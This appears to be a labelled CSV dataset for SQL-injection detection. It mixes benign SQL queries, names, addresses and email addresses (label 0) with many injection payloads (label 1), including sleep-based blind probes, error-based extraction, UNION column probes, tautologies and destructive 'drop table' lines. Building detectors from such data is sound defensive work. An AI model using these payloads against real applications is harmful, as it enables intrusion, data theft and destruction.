Query,Label
SELECT member ( s )  FROM mood SELECT clothing ( s ) ,0
rodolfo,0
SELECT AVG ( range ) FROM position SELECT SUM ( silver ) ,0
c/ hinojo 130 4?c,0
"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
acheros sanchis,0
"  SELECT library,making,fed FROM spoken LEFT JOIN Orders ON slope.begunID =  lesson.transportation ORDER BY split.row",0
paz,0
puges crcamo,0
printers,0
"select * from generate_series  (  5980,5980,case when   (  5980  =  5063  )   then 1 else 0 end  )   limit 1--",1
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1
"1   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   8867  =  8867",1
39699852n,0
"1%""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1
6.92E+15,0
"1"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",1
DELETE FROM fully WHERE memory = 'wonderful',0
1 where 6494  =  6494 and 8463  =  2760,1
SELECT * FROM rice WHERE bar BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM complete 3,0
hendrika@kayaalicante.sc,0
"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",1
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
"-8200%""   )    )    union all select 7538,7538,7538#",1
SELECT * FROM heart 3 SELECT * FROM college,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  ) ",0
nataln,0
SELECT * FROM occur FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM liquid,0
vallibona,0
" SELECT column_name ( s )  FROM drawn,lose",0
"   SELECT chapter,die,seat,can,proper     (  (  gun JOIN night ON higher.needle =  wall.yourself )   INNER JOIN freeON Orders.community =  rear.driverID ) ",0
"1,  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
SELECT COUNT ( cold )  FROM frame,0
"1' where 2964  =  2964 union all select null,null,null#",1
"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
estorbar,0
"1%'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
2639,0
 or 'x'  =  'x,1
1' where 1593  =  1593,1
1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,1
"INSERT INTO specific  ( did, simplest, happily )  VALUES  ( 'great', 'left', 'above' )  ",0
FROM  ( SELECT DISTINCT memory FROM track ) ,0
polanco,0
mandruso,0
"   SELECT warn, reach+ ', ' + firm+ ' ' + powerful+ ', ' + friendly AS ago  FROM attack",0
"-4695'   )    )     )   union all select 5844,5844,5844,5844,5844,5844#",1
SELECT wash ( s )  FROM lion,0
"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450",1
SELECT * FROM parallel FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM upper,0
1 where 7516  =  7516 union all select null#,1
SELECT ring FROM adult,0
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",1
1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
SELECT halfway ( s ) FROM spread INNER JOIN,0
SELECT * FROM leave WHERE count BETWEEN 'yourself' AND 'group',0
6015,0
SELECT * FROM report WHERE NOT listen = 'enter'  AND NOT favorite = 'right',0
"  SELECT simple,metal,save FROM card LEFT JOIN Orders ON radio.suddenID =  sold.beside ORDER BY class.upper",0
" SELECT * FROM finish ORDER BY cow, sound",0
select   (  case when   (  9388  =  4322  )   then 1 else 9388*  (  select 9388 from master..sysdatabases  )   end  )  --,1
sobrestante,0
11640,0
"1'  )   where 3255  =  3255 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
vilaprio,0
SELECT flew FROM couple UNION ALL SELECT wrapped FROM turn ORDER BY yesterday,0
 UPDATE breakfast SET science = 'strong'WHERE finish = 'main',0
SELECT AVG ( model ) FROM stick,0
"-3758'   )    )    union all select 9460,9460,9460,9460,9460,9460,9460,9460--",1
"1'   )    )    as ylyq where 2953  =  2953 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""vabm""  =  ""vabm",1
"1   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  2230  =  2230",1
-1492 where 2788  =  2788 union all select 2788#,1
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""wwaq""  =  ""wwaq",1
SELECT AVG ( history )  FROM famous  SELECT SUM ( figure ) ,0
SELECT weather ( s )  FROM out SELECT am ( s ) ,0
remington,0
"-2803'  )   as jciy where 1130  =  1130 or make_set  (  4599  =  6550,6550  )  --",1
pancracia,0
3.18663E+15,0
9640,0
SELECT * FROM function WHERE soft LIKE '%former%',0
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'gpax'  =  'gpax,1
or 1 in   (  select @@version  )  --,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""fkdx"" like ""fkdx",1
SELECT * FROM came FETCH FIRST 3 ROWS ONLY,0
moskuna@sitcpla.ye,0
nihei_donat@multaspendientes.cu,0
if  (  4947  =  5350  )   select 4947 else drop function ereg--,1
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1
9.54368E+15,0
SELECT * FROM bag,0
puntagorda,0
"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",1
SELECT * FROM plane,0
SELECT COT ( -2 ) ;,0
SELECT SYSDATE (  )  + 1;,0
SELECT COUNT ( similar ) FROM similar,0
"carrer nostra sra del pilar, 101",0
29450,0
1 and sleep  (  5  )  #,1
ulc0r81a,0
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""bmbg"" like ""bmbg",1
pascual,0
"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 301 )  ORDER BY meta_id ASC",0
bradney4,0
to2adora,0
or   (  EXISTS  ) ,1
"   SELECT wear,stone,whom,sat,first     (  (  higher JOIN ice ON sound.aware =  difference.halfway )   INNER JOIN callON Orders.force =  structure.taxID ) ",0
"-6381%""   )    )     )   union all select 1503,1503,1503,1503#",1
39sch6nz6da,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
"  SELECT they,right,matter FROM therefore LEFT JOIN Orders ON positive.deadID =  shape.standard ORDER BY naturally.or",0
SELECT AVG ( perfectly ) FROM band,0
1 where 6036  =  6036 and 7533  =  7533--,1
mayolas,0
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1
"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
SELECT prevent ( s )  FROM melted SELECT quarter FROM may,0
ginest baquedano,0
SELECT * FROM climate 3,0
salgado,0
blasinda,0
1  )   waitfor delay '0:0:5'--,1
"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""tzqk"" like ""tzqk",1
SELECT AVG ( me ) FROM physical,0
"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",1
"1'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
-8722%' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  ',1
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
1'   )    )    as yyrx where 5600  =  5600,1
"  SELECT eatID AS ID, all AS hot FROM earlier",0
"-9526 where 5734  =  5734 or elt  (  1032  =  1032,3623  )  --",1
"  (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1
t!74ador,0
1' rlike sleep  (  5  )  #,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""ksip"" like ""ksip",1
fla,0
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1
6.96678E+15,0
1'+  (  select ntym where 4750  =  4750,1
"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""uhvy""  =  ""uhvy",1
"1""  )   as ypfa where 6128  =  6128",1
SELECT * FROM excited WHERE class BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT pot FROM promised,0
SELECT forty ( s )  FROM grow,0
"calle venus, 81 2-a",0
41850,0
6.31786E+15,0
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
SELECT TOP 3 * FROM tax WHERE aboard = 'gulf' SELECT * FROM skin,0
"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",1
1'   )    )    and sleep  (  5  )   and    (    (   'krrr'  =  'krrr,1
select   (  case when   (  2783  =  9216  )   then 1 else 2783*  (  select 2783 from master..sysdatabases  )   end  )  --,1
calle puerto de alcolea 185 9-e,0
SELECT * FROM thee 3 SELECT * FROM molecular,0
octagonal,0
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1
"c/ ciutat freta, 37",0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'yvbb'  =  'yvbb",1
SELECT * FROM bank  WHERE riding NOT LIKE '[chair]%',0
SELECT particularly ( s )  FROM expect LEFT JOIN,0
SELECT * FROM jump WHERE garden BETWEEN third09/01/1996boat AND east15/31/1996plan,0
SELECT * FROM immediately FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM together,0
1   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   1260  =  1260,1
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",1
 ; drop table temp --,1
SELECT CURRENT_TIMESTAMP (  )  + 1;,0
"1%'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  '%'  =  '",1
SELECT * FROM wet WHERE recent BETWEEN '1996-07-01' AND '1996-07-31',0
"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM running WHERE    NOT frog = 'forest',0
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",1
SELECT AVG ( inside ) FROM proper SELECT SUM ( settlers ) ,0
corrales de duero,0
SELECT * FROM trouble WHERE organization = 'bottom' FETCH FIRST 3 ROWS ONLY,0
hiss@ajuntamentdebarcelona20.yu,0
"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",1
3.00245E+15,0
SELECT your ( s )  FROM onto FULL OUTER JOIN,0
"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",1
SELECT * FROM imagine  WHERE coach = horse,0
"-2718"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""xwbf""  =  ""xwbf",1
"  SELECT garage,worse,it FROM breath LEFT JOIN Orders ON needs.lotID =  wagon.characteristic ORDER BY mouse.spent",0
1.78478E+15,0
qui0g6n16si2o,0
waitfor delay '0:0:5' and    (    (     (  8981  =  8981,1
"  SELECT personalID AS ID, tape AS couple FROM happy",0
"1'+  (  select 'wkcq' where 1020  =  1020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
l1am217r5,0
"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",1
SELECT Count ( * )  AS army,0
"andia, 113 11g",0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_contact_email' LIMIT 1,0
5458,0
or a  =  a,1
6.1136E+15,0
"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",1
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
5198,0
SELECT * FROM truth WHERE said = 'five' LIMIT 3,0
"1%""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%""  =  """,1
"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",1
"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
feix ablitas,0
1 where 7299  =  7299 rlike sleep  (  5  )  --,1
SELECT met ( s )  FROM would SELECT last ( s ) ,0
"  SELECT * FROM yourself WHERE turn NOT IN  ( 'pony', 'degree', 'scared' )  ",0
pablo,0
"1""   )    )    union all select null,null,null,null,null,null,null--",1
"-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1
"SELECT * FROM spend WHERE full BETWEEN ""discovery"" AND    ""brought""",0
SELECT COUNT ( tooID ) FROM carried,0
"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",1
-9721'  )   or 9287  =  4362#,1
select   (  case when   (  2716  =  8138  )   then 2716 else 2716*  (  select 2716 from mysql.db  )   end  )  #,1
SELECT * FROM special,0
1'||  (  select 'lljg' from dual where 7631  =  7631,1
bowen-gugolka@soyriojano.name,0
"select benchmark  (  5000000,md5  (  0x714e4153   )    )   #",1
SELECT COUNT ( possibly )  FROM rose,0
SELECT TOP 3 * FROM opportunity WHERE finest = 'dawn',0
12190,0
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
if  (  3245  =  6168  )   select 3245 else drop function nafj--,1
"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT AVG ( usual ) FROM three,0
SELECT COUNT ( DISTINCT kept )  FROM canal,0
salip altares,0
SELECT * FROM what WHERE by = 'quarter',0
"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
rohit,0
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'aicu'  =  'aicu",1
SELECT * FROM seed,0
"   SELECT customs, they+ ', ' + go+ ' ' + diameter+ ', ' + horse AS ride  FROM growth",0
1'  )   where 9538  =  9538,1
serret@sierradealcaraz.dj,0
16601924h,0
"-4811'   )    )     )   union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",1
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
"calle juan sitges 24,",0
SELECT * FROM Products,0
foulk@eonon.com.es,0
"1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",1
1' and 5835  =  6157 and 'bjee' like 'bjee,1
31252,0
"  SELECT YEARWEEK ( ""2017-06-15"" ) ;",0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",1
" SELECT column_name ( s )  FROM zipper,hot",0
SELECT * FROM lower WHERE football  BETWEEN 10 AND 20,0
"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
"-3672""   )    )    union all select 6093#",1
"-8133'  )   union all select 6417,6417,6417,6417,6417,6417,6417,6417--",1
"1'   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
1  )   where 1929  =  1929 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,1
"1  )   where 7978  =  7978 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1%'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   '%'  =  '",1
DELETE FROM basket WHERE increase = 'cotton',0
SELECT * FROM fresh WHERE remove LIKE '%frame%',0
"1'+  (  select 'sppw' where 1677  =  1677 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
SELECT Count ( * )  AS is,0
SELECT Count ( * )  AS foreign,0
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'lyem' like 'lyem",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""gydr"" like ""gydr",1
veneranda,0
-2983'  )   or 8571  =  8571--,1
SELECT DISTINCT cage FROM relationship,0
4.61733E+15,0
yaci,0
SELECT MIN ( sunlight )  AS region FROM four,0
SELECT * FROM why WHERE quiet BETWEEN 'individual' AND 'at',0
1capa2ad*or,0
" SELECT * FROM certain ORDER BY judge, dinner",0
SELECT * FROM various WHERE gold = 'local' FETCH FIRST 3 ROWS ONLY,0
"-1084'  )   union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1
corazones 168,0
1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,1
"   SELECT bad, us, flame FROM putting WHERE string  IS NULL",0
"  UPDATE zebra SET mighty =  'ground', City =  'worried' WHERE press =  cent",0
1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--,1
SELECT * FROM fact WHERE brown BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT paragraph ( s FROM fourth RIGHT JOIN,0
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx",1
"1""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""ypoj""  =  ""ypoj",1
SELECT * FROM product WHERE NOT closely = 'lion'  AND NOT far = 'sink',0
alpar-ornstein@rockefeller.nu,0
SELECT * FROM coming 3,0
"  SELECT happilyID AS ID, market AS mine FROM rock",0
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
26562587w,0
2829,0
SELECT * FROM fast WHERE tribe BETWEEN '1996-07-01' AND '1996-07-31',0
-6095'  )   or 6872  =  6872 and   (  'bfwm' like 'bfwm,1
SELECT * FROM must WHERE protection = 'test'  OR bee = 'arrive',0
57401003h,0
SELECT * FROM carbon  WHERE seeing = quickly,0
"   SELECT pick, current+ ', ' + compare+ ' ' + screen+ ', ' + smallest AS pride  FROM child",0
"1""  )   as zovk where 4591  =  4591 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
SELECT dirty ( s ) FROM matter INNER JOIN,0
empuar,0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1
1'  )   and 2305  =  1934,1
garner3,0
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   '%'  =  ',1
caballol menocal,0
SELECT AVG ( he ) FROM author SELECT SUM ( pitch ) ,0
"1%"" rlike sleep  (  5  )   and ""%""  =  """,1
1'||  (  select 'ymre' where 8681  =  8681,1
SELECT TOP 50 PERCENT * FROM sort SELECT * FROM wind FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chief,0
SELECT zero,0
77232447b,0
minardi cardea,0
0 or 1  =  1,1
" SELECT * FROM fruit ORDER BY action, fear",0
"  SELECT mineID AS ID, all AS property FROM shore",0
SELECT AVG ( Price ) FROM settlers,0
SELECT AVG ( carry ) FROM industrial,0
florestano,0
1'+  (  select ijoh where 7145  =  7145 order by 1--,1
"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",1
SELECT   LOCALTIME (  )  + 1;,0
SELECT opposite FROM various,0
SELECT * FROM excitement WHERE meat BETWEEN scientific09/01/1996above AND mix15/31/1996step,0
tiberio,0
SELECT somebody ( s )  FROM private SELECT future FROM state,0
brait_burbridge@fichajes.nom.ic,0
"1%'   )    )    union all select null,null,null--",1
SELECT * FROM team WHERE subject = 'unknown',0
28189,0
1'   )    )    as cjjm where 1981  =  1981,1
-6202   )    )    or 7845  =  1962--,1
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1
" SELECT * FROM art ORDER BY carried, herself",0
ddimo,0
"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
3748ny,0
"c/ alicante, 83,",0
"1""  )   and 3732  =  3850 and   (  ""edjv""  =  ""edjv",1
SELECT AVG ( behavior ) FROM club,0
SELECT * FROM children WHERE pool NOT LIKE '[perhaps]%',0
"1 where 6100  =  6100 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1%'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  '%'  =  '",1
"   SELECT headed, statement+ ', ' + supply+ ' ' + because+ ', ' + whenever AS simple  FROM bottom",0
1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
-2929'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'nzmk'  =  'nzmk,1
DELETE FROM frighten WHERE ordinary = 'fine',0
